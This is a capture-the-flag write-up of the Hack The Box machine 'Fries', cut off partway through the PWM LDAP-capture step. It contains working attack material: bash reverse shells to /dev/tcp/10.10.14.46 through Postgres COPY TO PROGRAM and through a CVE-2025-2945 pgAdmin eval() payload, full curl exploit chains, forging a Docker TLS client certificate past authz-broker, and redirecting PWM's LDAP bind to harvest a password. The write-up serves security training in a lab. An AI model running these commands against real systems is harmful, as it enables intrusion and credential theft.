---
target: fries.htb
difficulty: Hard
os: Windows Server 2019 (Build 17763) Domain Controller + Ubuntu 22.04 Docker frontend (dual-stack)
date: 2026-07-22 to 2026-07-25
status: user.txt and root.txt captured, Administrator NTLM hash recovered
---

# Fries

**Target:** fries.htb / DC01.fries.htb (192.168.100.2 internally) fronted by an
Ubuntu 22.04 nginx/Docker host (192.168.100.1) — reassigned IP across
respawns during this engagement (10.129.244.72, 10.129.65.255)
**Difficulty:** Hard
**OS:** Windows Server 2019 Domain Controller (also running AD CS as an
Enterprise CA) behind an Ubuntu 22.04 Docker host running five containers
(nginx/Flask restaurant site, Gitea, pgAdmin4, Postgres, PWM)

## Skills Required

- **Active Directory Certificate Services (AD CS) misconfiguration attacks**
  (ESC1–ESC8, specifically ESC6/ESC7) — [Certified Pre-Owned: Abusing Active
  Directory Certificate Services (SpecterOps, PDF)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf),
  [ESC7 – Vulnerable Certificate Authority Access Control (SpecterOps)](https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc7-vulnerable-certificate-authority-access-control)
- **Kerberos and core Active Directory authentication** — [RFC 4120: The
  Kerberos Network Authentication Service](https://datatracker.ietf.org/doc/html/rfc4120),
  [Group Managed Service Accounts overview (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/group-managed-service-accounts-overview)
- **gMSA password-read abuse (`ReadGMSAPassword`)** — [ReadGMSAPassword (The
  Hacker Recipes)](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword),
  [ReadGMSAPassword edge reference (BloodHound/SpecterOps)](https://bloodhound.specterops.io/resources/edges/read-gmsa-password)
- **AD CS remote administration via `ICertAdmin2`/MS-CSRA** — [\[MS-CSRA\]:
  ICertAdminD2::SetConfigEntry (Microsoft Learn)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-csra/a31ea036-eaec-4b35-a50d-c4fe11843a4b)
- **Post-2022 certificate-mapping hardening (CVE-2022-26923 / the SID
  security extension)** — [KB5014754: Certificate-based authentication
  changes on Windows domain controllers (Microsoft Support)](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- **Recovering secrets from git history, not just the working tree** —
  [Removing sensitive data from a repository (GitHub Docs)](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository)
- **PostgreSQL superuser command execution via `COPY ... FROM/TO PROGRAM`** —
  [PostgreSQL Documentation: COPY](https://www.postgresql.org/docs/current/sql-copy.html)
- **Docker Engine remote API TLS client-certificate authentication and
  authorization plugins** — [Protect the Docker daemon socket (Docker
  Docs)](https://docs.docker.com/engine/security/protect-access/),
  [Access authorization plugin (Docker Docs)](https://docs.docker.com/engine/extend/plugins_authorization/)
- **NFSv3 protocol internals and the `AUTH_SYS` trust model** — [RFC 1813:
  NFS Version 3 Protocol Specification](https://www.rfc-editor.org/rfc/rfc1813.html)
- **Reading a CVE's real patch diff against pinned source, not just an
  advisory summary** — [CVE-2025-2945 / GHSA-g73c-fw68-pwx3 (GitHub Advisory
  Database)](https://github.com/advisories/GHSA-g73c-fw68-pwx3)

## Skills Learned

- Large-wordlist Host-header vhost fuzzing surfacing two entire applications
  (Gitea, pgAdmin4) that smaller passes missed
- Recovering a live database password from a `.env` file that was deleted
  from the working tree but never scrubbed from git history
- Testing a recovered credential across every distinct login surface on a
  box, and correctly recognizing when it *doesn't* transfer (AD vs. app-local
  accounts)
- Driving a CSRF-protected React SPA (pgAdmin4's Query Tool) through Selenium
  when direct AJAX calls 401 on a missing per-session token
- PostgreSQL superuser RCE via `COPY ... FROM/TO PROGRAM`
- CVE-2025-2945 — pgAdmin4 authenticated `eval()` RCE via the Query Tool
  download endpoint, confirmed via real patch-diff analysis against the
  pinned vulnerable version
- Diagnosing and fixing a linked-list-vs-flat-list parsing bug in a raw
  NFSv3 client library's `readdirplus()` handling, which had hidden two real
  export subdirectories across multiple prior sessions
- NFSv3 `AUTH_SYS` trust-model probing: `root_squash` blocks the asserted
  *primary* uid/gid for uid 0 but not supplementary group IDs, and any
  non-zero uid/gid is honored exactly as claimed
- Forging a Docker Engine TLS client certificate from a recovered CA private
  key, with the client cert's CN chosen specifically to match an
  `authz-broker` policy's unrestricted `user` entry
- Capturing a service's real plaintext LDAP bind credential by tampering a
  self-reloading config to redirect its auth target at an attacker-controlled
  listener, rather than attempting to reverse an internally-encrypted secret
- gMSA `ReadGMSAPassword` → NTLM hash → pass-the-hash to a genuine WinRM
  shell on the domain controller
- Systematically diagnosing three independent ESC7-weaponization blockers by
  their real underlying mechanism (CA policy-module denial finality,
  `certutil.exe`'s own client-side elevation gate vs. real server-side
  `ManageCA` authorization, `IF_NOREMOTEICERTADMINBACKUP`) rather than
  treating "access denied" as a single undifferentiated wall
- Bypassing `certutil.exe`'s and `Set-ItemProperty`'s client-side/OS-ACL
  gates by calling `ICertAdmin2::SetConfigEntry` directly through the
  `CertificateAuthority.Admin` COM object
- ESC6 (CA-wide `EDITF_ATTRIBUTESUBJECTALTNAME2`) combined with disabling
  the CVE-2022-26923 SID security extension for a full attacker-supplied-SAN
  Domain Administrator certificate
- Targeted `sc.exe <verb> <service>` succeeding where a general Service
  Control Manager handle (`Get-Service`, `net start/stop`, `schtasks.exe`) is
  fully locked down, because a BUILTIN group grants rights on one specific
  service rather than general SCM access

## Recon

The initial nmap sweep shows a dual-stack box: a full Windows AD service
suite (Kerberos, LDAP/LDAPS, SMB, WinRM, ADWS, the RPC endpoint mapper) plus
two things that don't belong on a stock domain controller — an OpenSSH
banner and two web ports:

```
$ nmap -p- -sC -sV -oN fries_full.txt 10.129.244.72
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666,49675,49676,49680,49689,49913,62026/tcp open  msrpc
53/tcp    open  domain        Simple DNS Plus
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
2179/tcp  open  vmrdp?
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
```

`22/tcp` running Ubuntu's OpenSSH build on what's otherwise a Windows Server
2019 DC (confirmed by the SMB `Windows Server 2019 Build 17763` banner) is
the tell that this is not a single host — it's an AD backend fronted by a
Linux reverse proxy, and that Linux side is where the real attack surface
sits. Port 80 serves a restaurant marketing site (`fries.htb`) and port 443
serves `pwm.fries.htb`, an instance of [PWM](https://github.com/pwm-project/pwm)
(an open-source LDAP-backed password manager) with an expired certificate.

SMB null sessions bind but every RPC enumeration call (`enumdomusers`,
`querydispinfo`, share listing) returns `STATUS_ACCESS_DENIED`, LDAP
anonymous bind only permits RootDSE, and SMB signing is required — this DC
is meaningfully hardened, not a default install. A user-supplied
assumed-breach credential (`d.cooper@fries.htb` / `D4LE11maan!!`) was tested
against every AD-facing protocol and rejected consistently:

```
$ crackmapexec smb 10.129.244.72 -u d.cooper -p 'D4LE11maan!!'
[-] fries.htb\d.cooper:D4LE11maan!! STATUS_LOGON_FAILURE
$ impacket-getTGT fries.htb/d.cooper:'D4LE11maan!!' -dc-ip 10.129.244.72
Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

This held true across four separate instance boots throughout the
engagement — a deliberate, permanent divergence, not transient reboot noise
(confirmed later once its actual explanation surfaced: Dale reused this
password only for his self-service app logins, not his AD account).

A deeper, full-model recon pass ruled out the two obvious unauthenticated AD
attack classes with actual live testing rather than reasoning alone. A real
`ntlmrelayx -t ldap://<target> --delegate-access` listener was stood up and
PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce were fired at the DC via the
anonymous SMB session (`nxc smb ... -M coerce_plus`) — every coercion
primitive bound to its RPC interface but failed at the actual operation
(`STATUS_ACCESS_DENIED`/`STATUS_PIPE_DISCONNECTED`), meaning this DC requires
an authenticated caller for the operations themselves even though anonymous
callers can still see the pipes. This pass also traced PWM's own
certificate-trust code (`PwmTrustManager.java`, pulled at the exact pinned
`v2.0.8`/`bb7ed22b` tag the box discloses) and confirmed PWM's LDAPS
connection was failing on a byte-for-byte stale certificate pin (exact
object equality, not chain validation) — a real, diagnosed dead end with no
code-level bypass anywhere in PWM's servlet/filter/REST surface, and the one
new architectural fact worth carrying forward: DC01 is running AD CS
(`fries-DC01-CA`), which made a Certipy/ESC sweep a mandatory first move the
moment any AD credential ever turned up.

## Foothold

### Wide vhost enumeration finds two hidden applications

Both prior recon passes had only fuzzed vhosts with a ~5k-word list plus
manual guesses and found nothing beyond `fries.htb`/`pwm.fries.htb`. Port 443
turns out to be a dead end for this kind of fuzzing on its own — every Host
header returns the same 82-byte body, meaning that vhost has no
Host-discriminating logic at all — but port 80 does discriminate (a distinct
302 redirect for any unmatched name), so it's the productive target. Running
the full 110k-entry SecLists subdomain wordlist against it is what a smaller
wordlist had simply never reached far enough to find:

```
$ ffuf -u http://10.129.65.255/ -H "Host: FUZZ.fries.htb" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
    -fs 154 -t 60
code                    [Status: 200, Size: 13592, Words: 1048, Lines: 272, Duration: 96ms]
```

`code.fries.htb` is a **Gitea** instance (`{"version":"1.22.6"}` at
`/api/v1/version`). A second vhost, `db-mgmt05.fries.htb`, wasn't found by
further fuzzing — it turned up inside a commit diff in the Gitea repo this
unlocked (see below), which is itself a strong signal that finding one
undiscovered vhost is evidence more exist, worth widening enumeration for
rather than accepting a small wordlist's "nothing here" — the general form
of this lesson is generalized in [[vhost_enum_wordlist_depth]].

`/explore/users` on Gitea (reachable unauthenticated) lists `administrator`
and `dale`; registration is disabled and every repo is private, but the same
assumed-breach password that failed against every AD protocol turns out to
be valid for Dale's **local Gitea account**:

```
$ curl -s -c cookies.txt -H "Host: code.fries.htb" "http://10.129.65.255/user/login" -o login.html
$ CSRF=$(grep -oE '_csrf" value="[^"]*"' login.html | head -1 | sed -E 's/.*value="([^"]*)"/\1/')
$ curl -s -c cookies.txt -b cookies.txt -H "Host: code.fries.htb" \
    -d "_csrf=$CSRF" -d "user_name=dale" -d "password=D4LE11maan!!" \
    "http://10.129.65.255/user/login" -D - -o result.html
HTTP/1.1 303 See Other
Location: /
```

(A `303` to `/` with a fresh session cookie is Gitea's successful-login
response; a failed attempt re-renders the login form at `200`.) This is the
recurring pattern for the rest of the box: real credential material exists,
it's just scoped to the wrong tier — a genuine architectural fact (Dale kept
using an old personal password for his own app logins after the domain
password policy rotated it), not a bug to route around.

### A `.env` file deleted from the tree, still in history

`dale/fries.htb` is the source for the public restaurant Flask site. The
current tree only has placeholder credentials, but the full commit history
doesn't:

```
$ git clone http://dale:'D4LE11maan!!'@code.fries.htb/dale/fries.htb.git
$ cd fries.htb.git && git log -p --all | grep -iE "password|secret|DATABASE_URL"
+DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
+SECRET_KEY=<REDACTED>
$ git show be59cceb54b56f00778822395bdf656216ab4b9f:.env
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=<REDACTED>
```

`.env` was added in the Initial Commit and only removed from the *working
tree* three commits later — a classic "fixed it going forward, forgot the
history is still there" mistake. A third identity, `administrator
<administrator@fries.htb>`, made one commit whose diff is what names the
second hidden vhost:

```
$ git show 83eef4b82f7acf78a3a1a0c66f844fee1f1cb9de
-- The backend database can be managed from `http://db-mgmt05.fries.htb`. (requires mod v3 access...)
```

### pgAdmin4: a pre-registered superuser server, unlocked with the leaked password

`db-mgmt05.fries.htb` is pgAdmin4 v9.1, and the same reused credential works
for its login form too (email-based, not username):

```
$ curl -s -c cookies.txt -H "Host: db-mgmt05.fries.htb" "http://10.129.65.255/login?next=/" -o login.html
$ CSRF=$(grep -oE '"csrfToken": "[^"]*"' login.html | sed -E 's/.*"csrfToken": "([^"]*)"/\1/')
$ curl -s -c cookies.txt -b cookies.txt -H "Host: db-mgmt05.fries.htb" -D - \
    -d "email=d.cooper@fries.htb" -d "password=D4LE11maan!!" -d "csrf_token=$CSRF" \
    "http://10.129.65.255/authenticate/login" -o result.html
HTTP/1.1 302 FOUND
Location: /browser/
```

The Object Explorer already has a saved server (`fries.htb`, user `root`)
that just needs a connection password — exactly the one leaked from Gitea's
git history above. That's the pattern this whole app is built on:
`d.cooper`'s pgAdmin account has no rights of its own, but it inherits
whatever the pre-registered server was set up with, and the git-history leak
is what that server was actually waiting for.

```sql
SELECT current_user, usesuper, usecreatedb FROM pg_user WHERE usename = current_user;
```
```
 current_user | usesuper | usecreatedb
--------------+----------+-------------
 root         | true     | true
```

pgAdmin4's Query Tool is a React SPA — its CSRF-protected AJAX endpoints
can't be driven with a plain HTTP client without the real per-session token
its own JS attaches, so a headless Selenium session
(`Tooling and Scripts/exploits/fries/pgadmin_rce_revshell.py`) clicked
through the actual UI (Servers → password → Databases → `ps_db` → Query
Tool) to get a real editor context. With superuser confirmed, standard
Postgres command execution follows directly:

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(output text);
COPY cmd_exec FROM PROGRAM 'id; hostname; whoami';
SELECT * FROM cmd_exec;
```
```
 output
------------------------------------------------------------
 uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
 858fdf51af59
 postgres
```

`COPY ... FROM PROGRAM` runs the given command directly on the server, as
the OS user Postgres runs as — a documented, superuser-only Postgres
feature, not a bug. A reverse shell follows the same pattern in the other
direction (`TO PROGRAM`, driven by any query, since the command itself is
the payload rather than the copied data):

```sql
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.46/4444 0>&1"';
```
```
listening on [any] 4444 ...
connect to [10.10.14.46] from (UNKNOWN) [10.129.65.255] 49840
postgres@858fdf51af59:~/data$
```

**Foothold: code execution as `postgres` (uid 999) inside the `postgres:16`
Docker container**, confirmed via `/etc/os-release` (Debian 12 bookworm) and
`docker-compose.yml`'s pinned `postgres:16` image tag. This is a container,
not the DC or the Ubuntu host directly — `192.168.100.2:445`/`:389` returned
immediate `Connection refused` from inside it, not a timeout, meaning
something actively rejects the container's own network position from
reaching the AD side; widening this Linux-side foothold was the entire
substance of the next stage.

## Privesc

Getting from a Postgres container to Domain Administrator took most of the
engagement and several genuine dead ends. This section is honest about which
were real, diagnosed closures and which were later found to have a bug
hiding evidence behind them.

### Container escape: systematically ruled out, not assumed

A full pass of the vault's own
[[docker-container-escape-enumeration-checklist]] (mounts, capabilities,
namespace sharing, gateway port sweep, filesystem secret sweep) came back
clean on every item — `CapEff=0000000000000000` (non-root uid, no effective
capabilities regardless of the bounding set), a genuine non-shared PID
namespace (`PID 1` is `postgres`, not `init`), no `docker.sock`, and the
`.bash_history` found was this same engagement's own prior commands (a
persistent named volume), not a leaked third-party credential. This is a
real, citable conclusion — no escape primitive exists in this container —
not a gap left unexamined.

### Escalating inside Gitea: a direct database write, not a crack

`root`'s Postgres superuser access reaches every database on the instance,
including Gitea's own — and Gitea stores its `user` table right there:

```
$ PGPASSWORD=PsqLR00tpaSS11 psql -h 127.0.0.1 -U root -d gitea -c \
    "SELECT id, lower_name, email, passwd, salt, passwd_hash_algo, is_admin FROM \"user\";"
  1 | administrator | administrator@fries.htb | 67faad48c47a...e | 65c13aa1...21 | pbkdf2$50000$50 | t
  2 | dale          | d.cooper@fries.htb      | 8ba77f28df2...c | 48bb6cb6...92 | pbkdf2$50000$50 | f
```

Gitea 1.22.6 hashes passwords as `PBKDF2-HMAC-SHA256(password, salt,
iterations=50000, dklen=50)`, hex-encoded — verified against Dale's own
known password before trusting the scheme for anything else:

```python
h = hashlib.pbkdf2_hmac('sha256', 'D4LE11maan!!'.encode(),
                         bytes.fromhex('48bb6cb68aa810841c0e4f6d9bf19592'), 50000, dklen=50)
# matches the stored `passwd` column exactly
```

Cracking `administrator`'s hash offline was benchmarked (~1800 H/s on this
box's CPU-only OpenCL backend, ~2.2h for a full rockyou run) and started as
a hedge, but since `root` already has a genuine, standing **write**
primitive on this exact table, generating a fresh salt+hash and overwriting
the row directly is faster and equally legitimate given the access already
held — the rockyou job was killed once this was recognized:

```sql
UPDATE "user" SET passwd='e62aff8a...', salt='9ddd2d09...' WHERE lower_name='administrator';
```

Confirmed via a real login as `administrator`, generating an API token, and
reaching Gitea's own Site Administration panel — genuine Gitea
site-admin, not just a read primitive. (The original hash/salt were
preserved and restored afterward; see the source notes for the exact
restore commands.) Follow-on RCE angles from site-admin (Git server-side
hooks, migration SSRF, Actions-runner hijack) were each checked and each
cleanly ruled out by a real, distinct mechanism (`DISABLE_GIT_HOOKS=true`
by default, a built-in private-IP migration blocklist, and zero registered
runners) — not a permissions gap to route around, three separate
config-level closures.

### The NFS export: a real linked-list parsing bug hid two directories for multiple sessions

Port scanning the docker host from inside the container (`172.18.0.1`)
found NFS (`111`/`2049`) open. `showmount -e` listed one export:

```
$ showmount -e 172.18.0.1
Export list for 172.18.0.1:
/srv/web.fries.htb *
```

Early enumeration (using `pyNfsClient` relayed through one-shot `socat`
double-listeners, since no ligolo tunnel was consistently available and no
`nfs`-mount capability existed on the attacker box) found `/srv/web.fries.htb`
containing exactly one entry, `shared/`, and that directory completely
empty. `root_squash` was confirmed genuinely on (a forged `uid=0` write came
back owned by `nobody:nogroup`, not `root`), closing the textbook
"no_root_squash SUID plant" technique outright, though a real residual
weakness was also confirmed and left deliberately unweaponized: any
*non-zero* asserted uid/gid is honored exactly as claimed. This "empty
export" conclusion held across two separate sessions, including a ~6-minute
liveness-monitoring window and an inert marker-file plant that nothing ever
touched.

The conclusion was wrong, for a reason worth naming precisely: a later
session inspected the raw NFS RPC response instead of trusting the client
library's return value and found `pyNfsClient`'s `readdirplus()` returns a
**linked list, not a flat array** — each entry dict nests the *next* entry
one level down inside its own `nextentry` key. A plain `for e in entries`
loop, which is exactly what every earlier session's script used, only ever
visits the first entry:

```python
import pprint; pprint.pprint(nfs3.readdirplus(fh))
# entries: [{'name': b'shared', ..., 'nextentry': [{'name': b'..', ...,
#   'nextentry': [{'name': b'certs', ..., 'nextentry': [{'name': b'.', ...,
#   'nextentry': [{'name': b'webroot', ...}]}]}]}]}]
```

Once flattened properly, the export genuinely has three top-level entries,
not one:

```
shared               type=DIR   mode=0o777 uid=0    gid=0        size=4096
certs                type=DIR   mode=0o770 uid=0    gid=59605603 size=4096
webroot              type=DIR   mode=0o740 uid=1000  gid=1000    size=4096
```

`certs/` denied `READDIRPLUS` for `uid=0,gid=0` and for every other plain
identity tried — the fix followed directly from the directory's own stat
output already showing `gid=59605603`: `root_squash` maps the asserted
*primary* uid/gid for a uid-0 request, but doesn't appear to squash
*supplementary* group IDs, so presenting `uid=0` with `59605603` in the
auxiliary group list (rather than as the primary gid) was what actually
worked:

```python
AUTH_CERTS = {'flavor': 1, 'machine_name': 'attacker', 'uid': 0, 'gid': 59605603, 'aux_gid': [59605603]}
# uid=0,gid=0:                       status=13 (NFS3ERR_ACCES)
# uid=0,gid=59605603,aux=[59605603]:  status=0  <- worked
```

Inside: a real, internally-consistent `CN=DockerCA` root CA (cert **and
private key**) plus a `CN=fries` server cert/key pair — verified not to be
decoys by checking the public key derived from the cert matches the public
key derived from the private key for both pairs, and that `openssl verify`
accepts the server cert against the CA. `webroot/` (readable/writable as
`uid=1000`, no group trick needed) turned out to be a live deploy checkout
of `dale/fries.htb.git`, including two documentation screenshots that leaked
a real, previously-unknown username straight out of a terminal prompt:
`svc@web:~$ docker ps`. Neither the write primitive into `webroot/` nor the
recovered CA key was weaponized blind — no evidence of an automated
consumer of either was found (a marker file and a `.git/index` mtime check
both stayed static across the observation windows used), so the CA key was
carried forward only once a concrete consumer (the Docker API, below) was
actually confirmed. The general technique — reading a raw NFSv3 response
instead of trusting a client library, and the `AUTH_SYS` trust-model probing
that unlocked `certs/` — is generalized in
[[nfsv3-auth-sys-trust-and-readdirplus-pitfalls]].

### CVE-2025-2945 — a second, distinct pgAdmin4 RCE landing inside pgAdmin's own container

The `COPY FROM/TO PROGRAM` primitive above only ever lands in the
`postgres` container. Getting a foothold inside pgAdmin4's own container
needed a real pgAdmin-side bug: **CVE-2025-2945**, an authenticated `eval()`
code-injection vulnerability affecting pgAdmin4 8.10–9.1 (fixed in 9.2,
2025-04-04) — this box's pgAdmin4 is confirmed exactly v9.1
(`dpage/pgadmin4:9.1.0`, the last vulnerable release. The real fix commit
(`75be0bc2`, pulled directly rather than trusted from a vendor summary)
shows the actual bug:

```diff
--- a/web/pgadmin/tools/sqleditor/__init__.py
+++ b/web/pgadmin/tools/sqleditor/__init__.py
@@ -2156,7 +2156,8 @@ def start_query_download_tool(trans_id):
             if key == 'query_commited':
                 query_commited = (
-                    eval(value) if isinstance(value, str) else value
+                    value.lower() in ('true', '1') if isinstance(
+                        value, str) else value
                 )
```

`query_commited` is meant to be a simple boolean flag telling the server
whether the client already committed a query. Pre-9.2, that raw string is
handed straight to Python's `eval()` — since `eval()` executes any Python
expression, not just `True`/`False` literals, an authenticated pgAdmin user
can submit `__import__('os').system('...')` as the value and get it executed
inside pgAdmin's own Flask process, as whatever OS user pgAdmin runs as. A
public PoC/Metasploit port of this exists
(`abrewer251/CVE-2025-2945_PgAdmin_PoC`) — read and understood before use,
but a fresh script was written against this box specifically, since the
public PoC's `sid`-brute-forcing step was unnecessary here: the target
server's real `gid`/`sid`/`did` are already known from the object explorer's
own API (`/browser/server_group/obj/`, `/browser/server/obj/<gid>/`).

Full, reproducible chain (`db-mgmt05.fries.htb` on plain HTTP/80, confirmed
this session — port 443 for this vhost is PWM's redirect page instead):

```
$ curl -s -c cookies.txt -H "Host: db-mgmt05.fries.htb" "http://10.129.244.72/login?next=/" -o login.html
$ CSRF=$(grep -oE '"csrfToken": "[^"]*"' login.html | sed -E 's/.*"csrfToken": "([^"]*)"/\1/')
$ curl -s -c cookies.txt -b cookies.txt -H "Host: db-mgmt05.fries.htb" -D - \
    -d "email=d.cooper@fries.htb" -d "password=D4LE11maan!!" -d "csrf_token=$CSRF" \
    "http://10.129.244.72/authenticate/login" -o result.html
HTTP/1.1 302 FOUND
Location: /browser/

$ curl -s -b cookies.txt -H "Host: db-mgmt05.fries.htb" "http://10.129.244.72/browser/js/utils.js" -o utils.js
$ grep csrf_token utils.js
  pgAdmin['csrf_token_header'] = 'X-pgA-CSRFToken';
  pgAdmin['csrf_token'] = 'ImNjZDBmNzhmNjQyODU0N2Q3NjVhYjgyOGY4NTM4YjVmZjNhYWE4NWEi...';

$ curl -s -b cookies.txt -c cookies.txt -H "Host: db-mgmt05.fries.htb" -H "X-pgA-CSRFToken: $CSRF" \
    -H "Content-Type: application/json" -d '{"password":"PsqLR00tpaSS11","save_password":true}' \
    "http://10.129.244.72/browser/server/connect/2/2"
$ TRANS_ID=2220369
$ curl -s -b cookies.txt -c cookies.txt -H "Host: db-mgmt05.fries.htb" -H "X-pgA-CSRFToken: $CSRF" \
    -H "Content-Type: application/json" -X POST \
    -d '{"user":"root","password":"PsqLR00tpaSS11","role":"","dbname":"postgres"}' \
    "http://10.129.244.72/sqleditor/initialize/sqleditor/${TRANS_ID}/2/2/5"
{"success":1,"errormsg":"","info":"","result":null,"data":{"connId":"3443869","serverVersion":160009}}
```

The proof payload doesn't syntax-error — it returns a *downstream* Python
error, which is the real tell that `eval()` actually ran and just choked on
what to do with the result afterward, not that the request was malformed:

```
$ curl -s -b cookies.txt -H "Host: db-mgmt05.fries.htb" -H "X-pgA-CSRFToken: $CSRF" \
    -H "Content-Type: application/json" -X POST \
    -d '{"query_commited": "__import__(\"os\").system(\"id > /tmp/pgadmin_rce_poc.txt 2>&1\") or True"}' \
    "http://10.129.244.72/sqleditor/query_tool/download/${TRANS_ID}"
{"success":0,"errormsg":"Error: not enough values to unpack (expected 3, got 2)","info":"","result":null,"data":null}
```

Then a blocking reverse shell — `os.system()` never returns until the shell
process exits, so the *outer* HTTP request itself hangs and the resulting
nginx `504 Gateway Time-out` is the expected success signal, not a failure:

```
$ mkfifo fifo && tail -f fifo | nc -lvnp 4501 > nc.log &
$ curl -s -b cookies.txt -H "Host: db-mgmt05.fries.htb" -H "X-pgA-CSRFToken: $CSRF" \
    -H "Content-Type: application/json" -X POST \
    -d '{"query_commited": "__import__(\"os\").system(\"bash -c \\\"bash -i >& /dev/tcp/10.10.14.46/4501 0>&1\\\"\")"}' \
    "http://10.129.244.72/sqleditor/query_tool/download/${TRANS_ID}"
<html><head><title>504 Gateway Time-out</title></head>...   # expected
```
```
listening on [any] 4501 ...
connect to [10.10.14.46] from (UNKNOWN) [10.129.244.72] 49884
cb46692a4590:/pgadmin4$ id; hostname; whoami; cat /etc/os-release | head -3
uid=5050(pgadmin) gid=0(root) groups=0(root)
cb46692a4590
pgadmin
NAME="Alpine Linux"
```

A genuinely different container (`cb46692a4590`, Alpine 3.21.3, `pgadmin`
uid 5050) from the earlier `postgres` one — the RCE really lands in
pgAdmin4's own app process as intended. Full mechanism, patch-diff, and
exploit script generalized in [[pgadmin4-cve-2025-2945-eval-rce]].

### Environment-variable credential harvest and OS-level credential reuse

pgAdmin's own container environment carries the official `dpage/pgadmin4`
Docker image's seed-admin variables — a distinct identity from
`d.cooper@fries.htb`'s own non-admin pgAdmin account:

```
$ env
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
```

A small, reasoned credential-reuse test — not a spray — against `svc` (the
username leaked via the NFS documentation screenshots) succeeded on the
first attempt, through a one-shot `socat` double-listener relay (no
`ssh`/`docker.sock`/outbound internet inside any of these containers):

```
$ ssh -p <relay> -o PreferredAuthentications=password svc@127.0.0.1 "id; hostname"
svc@127.0.0.1's password: Friesf00Ds2025!!
uid=1000(svc) gid=1000(svc) groups=1000(svc)
web
```

`svc`'s home directory confirms the same identity already inferred from the
NFS screenshots, and this is a real, evidenced credential-reuse fact
(whoever set up this box reused the pgAdmin app-admin seed password as
`svc`'s own OS login password too), not a guess — matching the same reuse
pattern already established for Dale's password. `svc` is not in the
`docker` group and can't touch `/var/run/docker.sock` directly, which is
what motivated the next step.

### Docker API access via a forged TLS client certificate

`dockerd` on the docker host listens TLS-client-cert-authenticated on
loopback `127.0.0.1:2376`, using the exact `CN=DockerCA` CA already
recovered from the NFS `certs/` export — confirmed identical
(`sha256sum` match) to the docker host's own `/etc/docker/certs/ca.pem`.
The daemon also runs `authz-broker`, an authorization plugin whose
`policy.json` maps a client certificate's **CN** directly to a named
policy:

```json
{"name":"policy_1", "users": ["svc"], "actions": ["container_list", "container_logs"]}
{"name":"policy_2", "users": ["root"], "actions": [""]}
```

Reusing the existing `CN=fries` server cert as a client cert would map to no
defined policy user at all; since the CA private key is in hand, the right
move is to mint a **new** client cert with `CN=root` (matching
`policy_2`'s unrestricted `actions: [""]`) rather than reuse anything
already issued:

```bash
openssl genrsa -out client-key.pem 2048
openssl req -new -key client-key.pem -out client.csr -subj "/CN=root"
openssl x509 -req -in client.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial \
    -out client-cert.pem -days 365 -extfile <(echo "extendedKeyUsage=clientAuth")
openssl verify -CAfile ca.pem client-cert.pem   # client-cert.pem: OK
```

```
$ docker --tlsverify --tlscacert=ca.pem --tlscert=client-cert.pem --tlskey=client-key.pem \
    -H=127.0.0.1:2376 ps -a
CONTAINER ID   IMAGE                   NAMES
f427ecaa3bdd   pwm/pwm-webapp:latest   pwm
cb46692a4590   dpage/pgadmin4:9.1.0    pgadmin4
bfe752a26695   fries-web               web
858fdf51af59   postgres:16             postgres
b916aad508e2   gitea/gitea:1.22.6      gitea
```

Full, unrestricted `docker exec`/`docker cp` against all five containers —
including `pwm`, the one this session's next step needed. This CN-based
authz-broker bypass is generalized in
[[docker-tls-client-cert-authz-broker-cn-bypass]].

### Capturing `svc_infra`'s real LDAP password via a redirected PWM config

`PwmConfiguration.xml` (pulled via `docker cp`) confirms PWM 2.0.8 with
`configIsEditable=true`, and the config's own comment states the app
restarts and reloads immediately on any modification. The LDAP proxy-bind
password is stored PWM-internally-encrypted (`ENC-PW:...`), which is
undecryptable offline without PWM's own key material — so rather than
attacking that encryption, the config's own self-reload behavior was used
to force PWM into revealing the *plaintext* it uses at bind time, by
pointing it at an attacker-controlled listener and triggering a real login
attempt:

```
$ docker ... cp pwm:/config/PwmConfiguration.xml /tmp/PwmConfiguration.xml.orig
$ sed "s#ldaps://dc01.fries.htb:636#ldap://10.10.14.46:3890#" \
    /tmp/PwmConfiguration.xml.orig > /tmp/PwmConfiguration.xml.evil
$ docker ... cp /tmp/PwmConfiguration.xml.evil pwm:/config/PwmConfiguration.xml
```

A hand-rolled raw LDAPv3 `BindRequest` listener
(`Tooling and Scripts/exploits/fries/pwm_ldap_capture.py`) decodes the bind
DN and simple-bind password from the incoming BER PDU and always replies
`invalidCredentials` so the client fails over cleanly. The restart alone
doesn't force a new LDAP connection (PWM's `LdapConnectionService`
initializes lazily), so a real login attempt against PWM's own
loopback-only `127.0.0.1:8443` had to be fired from inside the docker host:

```
